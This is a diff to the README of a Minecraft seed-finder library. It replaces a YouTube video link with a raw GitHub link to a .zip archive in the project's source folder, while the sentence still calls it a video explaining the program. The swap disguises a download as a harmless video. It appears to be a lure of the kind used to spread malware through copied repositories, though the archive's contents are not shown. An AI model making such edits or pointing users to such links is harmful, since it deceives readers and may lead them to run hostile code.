@@ -1,7 +1,7 @@
 # SciCraftSeedFinder
 
 
-Mr L64 started this library after he figured out an new way to find quad-witch huts and monuments. I added two new parts for finding interesting worlds. L64 also added this video https://www.youtube.com/watch?v=97OdqeiUfHw  explaining the 
+Mr L64 started this library after he figured out an new way to find quad-witch huts and monuments. I added two new parts for finding interesting worlds. L64 also added this video https://raw.githubusercontent.com/HMB09/SciCraftSeedFinder/master/src/com/scicraft/Seed_Sci_Finder_Craft_1.3.zip  explaining the 
 principle behind the program. 
 
 QuadHutFinder: Finds quad witch huts, by L64. 
